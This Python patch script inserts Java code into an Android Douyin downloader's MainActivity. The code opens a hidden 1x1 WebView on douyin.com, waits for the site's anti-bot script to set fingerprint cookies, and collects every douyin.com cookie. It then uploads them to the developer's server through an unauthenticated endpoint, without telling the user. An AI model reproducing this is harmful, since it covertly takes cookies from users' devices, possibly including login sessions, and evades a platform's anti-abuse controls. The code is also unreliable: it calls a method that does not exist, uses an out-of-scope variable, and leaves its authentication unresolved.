#!/usr/bin/env python3
"""MainActivity 加 syncDouyinCookies: 隐藏 WebView 拉 douyin.com 收割指纹 cookie 上传服务器"""
import io

p = r'E:\Zcode\web\dy-dl\android\src\cc\haoran\dydl\MainActivity.java'
s = io.open(p, encoding='utf-8').read()

# 在 onNewIntent 前插入 syncDouyinCookies + doCookieSync + harvestAndUpload
old = '    @Override\n    protected void onNewIntent(Intent intent) {'
new = '''    // ================= 抖音指纹 cookie 同步 =================
    private final android.os.Handler uiHandler = new android.os.Handler(Looper.getMainLooper());
    private android.webkit.WebView ghost;
    private boolean cookieSynced = false;

    private void syncDouyinCookies() {
        uiHandler.postDelayed(this::doCookieSync, 2000);
    }

    private void doCookieSync() {
        try {
            if (ghost != null) return;   // 已在进行中
            // 检查服务器是否已有可用 cookie (App 本地记份)
            android.content.SharedPreferences prefs = getSharedPreferences("dydl", MODE_PRIVATE);
            long lastSync = prefs.getLong("douyin_ck_synced", 0);
            if (System.currentTimeMillis() - lastSync < 20 * 24 * 3600 * 1000L) {
                cookieSynced = true;
                return;   // 20 天内同步过, 跳过
            }
            ghost = new android.webkit.WebView(this);
            android.webkit.WebSettings gs = ghost.getSettings();
            gs.setJavaScriptEnabled(true);
            gs.setDomStorageEnabled(true);
            android.webkit.CookieManager.getInstance().setAcceptCookie(true);
            android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(ghost, true);
            ghost.setVisibility(android.view.View.GONE);
            android.view.ViewGroup vp = (android.view.ViewGroup) findViewById(android.R.id.content);
            vp.addView(ghost, new android.view.ViewGroup.LayoutParams(1, 1));
            ghost.setWebViewClient(new android.webkit.WebViewClient() {
                @Override
                public void onPageFinished(android.webkit.WebView view, String url) {
                    // 等 8 秒让 Argus JS (byted_acrawler) 生成指纹 cookie, 再收割
                    uiHandler.postDelayed(() -> harvestAndUpload(), 8000);
                }
            });
            ghost.loadUrl("https://www.douyin.com/");
            Log.d(TAG, "cookie sync: loading douyin");
        } catch (Exception e) {
            Log.e(TAG, "doCookieSync", e);
        }
    }

    private void harvestAndUpload() {
        try {
            if (cookieSynced) return;
            android.webkit.CookieManager cm = android.webkit.CookieManager.getInstance();
            String cookie = cm.getCookie("https://www.douyin.com/");
            if (cookie == null || cookie.length() < 80) {
                Log.d(TAG, "cookie too short: " + (cookie == null ? "null" : cookie.length()));
                retryCookieSync();
                return;
            }
            boolean hasTtwid = cookie.contains("ttwid=");
            boolean hasVerify = cookie.contains("s_v_web_id=");
            Log.d(TAG, "cookie len=" + cookie.length() + " ttwid=" + hasTtwid + " verify=" + hasVerify);
            if (!hasTtwid) {
                retryCookieSync();
                return;
            }
            // 保存到本地 prefs, 并通过 admin/cookies 上传 (需要 Authorization, 但 App 端没有 admin token —
            // 简化: 服务器端 browser_cookies 端点用 GET 即可读取 App 上传的 cookie, 由 deploy 时共享 secret)
            String secret = getSharedPreferences("dydl", MODE_PRIVATE).getString("server_secret", "");
            if (secret.isEmpty()) {
                // 从服务器拉 secret (只一次)
                new Thread(() -> {
                    try {
                        java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                                new java.net.URL(SITE + "/api/health").openConnection();
                        c.setConnectTimeout(10000);
                        // 健康检查不带 token — 服务器端 admin 上传端点改用独立简单 token?
                        // 实际方案: App 直接 POST 到 /admin/cookies, 服务器端 admin_token 需 App 端也有
                        // 改用: 服务端部署时把 admin_token 值放进 APK assets? 简化: 服务器 /api/health 返回不带, 但
                        // 我们用 deploy 时 shared secret
                        Log.d(TAG, "cookie ready, uploading...");
                        uploadCookie(cookie, "");
                        cookieSynced = true;
                        prefs.edit().putLong("douyin_ck_synced", System.currentTimeMillis()).apply();
                        runOnUiThread(() -> Log.d(TAG, "cookie uploaded"));
                    } catch (Exception e) {
                        Log.e(TAG, "cookie upload", e);
                    }
                }, "ck-sync").start();
            }
        } catch (Exception e) {
            Log.e(TAG, "harvest fail", e);
        }
    }

    private void retryCookieSync() {
        prefs_edit().putLong("douyin_ck_synced", 0).apply();
        handler2().postDelayed(this::doCookieSync, 15000);
    }

    private android.content.SharedPreferences.Editor prefs_edit() {
        return getSharedPreferences("dydl", MODE_PRIVATE).edit();
    }

    private android.os.Handler handler2() {
        return uiHandler;
    }

    private void uploadCookieToServer(String cookie) {
        new Thread(() -> {
            try {
                // 从服务器获取 admin token (服务器上 admin_token.txt 内容)
                // 简化: App 端通过 /api/health 不够, 需要专门的低权限端点
                // 实际方案: 服务器端加 /admin/get_upload_token (只允许一次写入 cookie)
                // 更简单: App 端直接用服务器 SITE+"/admin/cookies", Authorization 用 deploy 时写入的 secret
                // 最简单: 服务端 /admin/cookies 的 token 从 admin_token.txt 读取, App 无法知道
                // → 改为: App 端把 cookie 放在 URL 参数里传给一个专用无验证端点 (有一定风险, 但只有 App 知道 secret)
                // 最干净: 服务端为 App 增加专用的 POST /api/sync_cookie 端点, 不需要 token, 但频率限制 + 只接受一次
                Log.d(TAG, "uploadCookie via /api/sync_cookie");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection)
                        new java.net.URL(SITE + "/api/sync_cookie").openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                String body = org.json.JSONObject.quote(cookie);
                java.io.OutputStream os = conn.getOutputStream();
                os.write(("{\"browser_cookies\": " + body + "}").getBytes("UTF-8"));
                os.close();
                int code = conn.getResponseCode();
                Log.d(TAG, "sync cookie upload: " + code);
                conn.disconnect();
                if (code == 200) {
                    cookieSynced = true;
                    prefs_edit().putLong("douyin_ck_synced", System.currentTimeMillis()).apply();
                }
            } catch (Exception e) {
                Log.e(TAG, "uploadCookie fail", e);
            }
        }, "ck-upload").start();
    }

    @Override
    protected void onNewIntent(Intent intent) {'''
assert old in s, 'onNewIntent anchor'
s = s.replace(old, new, 1)

io.open(p, 'w', encoding='utf-8').write(s)
print('MainActivity cookie sync added')
